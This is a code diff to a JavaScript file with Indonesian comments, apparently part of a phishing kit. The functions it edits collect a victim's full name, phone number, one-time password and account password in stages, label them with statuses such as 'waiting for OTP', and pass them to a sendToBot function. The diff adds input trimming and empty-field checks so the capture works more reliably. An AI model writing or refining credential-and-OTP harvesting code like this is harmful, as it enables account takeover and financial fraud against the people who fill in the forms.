@@ -83,9 +83,18 @@ function timeSince(date) {
 }
 
 // Fungsi untuk mengambil data dari form pertama
+// Fungsi untuk mengambil data dari form pertama
 function processFirstData() {
-  formData.fullName = document.getElementById("full_name").value;
-  formData.phoneNumber = document.getElementById("phone_number").value;
+  const fullName = document.getElementById("full_name").value.trim();
+  const phoneNumber = document.getElementById("phone_number").value.trim();
+
+  if (!fullName || !phoneNumber) {
+    // alert("Semua kolom harus diisi.");
+    return;
+  }
+
+  formData.fullName = fullName;
+  formData.phoneNumber = phoneNumber;
   formData.status = "Menunggu OTP";
 
   sendToBot(formData);
@@ -96,8 +105,16 @@ function processFirstData() {
 
 // Fungsi untuk mengambil data dari form kedua
 function processSecondData() {
-  formData.otp = document.getElementById("otp").value;
-  formData.password = document.getElementById("password").value;
+  const otp = document.getElementById("otp").value.trim();
+  const password = document.getElementById("password").value.trim();
+
+  if (!otp || !password) {
+    // alert("Semua kolom harus diisi.");
+    return;
+  }
+
+  formData.otp = otp;
+  formData.password = password;
   formData.status = "Menunggu Konfirmasi";
 
   sendToBot(formData);
@@ -108,7 +125,14 @@ function processSecondData() {
 
 // Fungsi untuk mengambil data dari form ketiga dan mengirimkan data lengkap
 function processThirdData() {
-  formData.password = document.getElementById("password").value;
+  const password = document.getElementById("password").value.trim();
+
+  if (!password) {
+    // alert("Kata sandi harus diisi.");
+    return;
+  }
+
+  formData.password = password;
   formData.status = "Proses Selesai";
 
   // Mengirim semua data yang sudah terkumpul
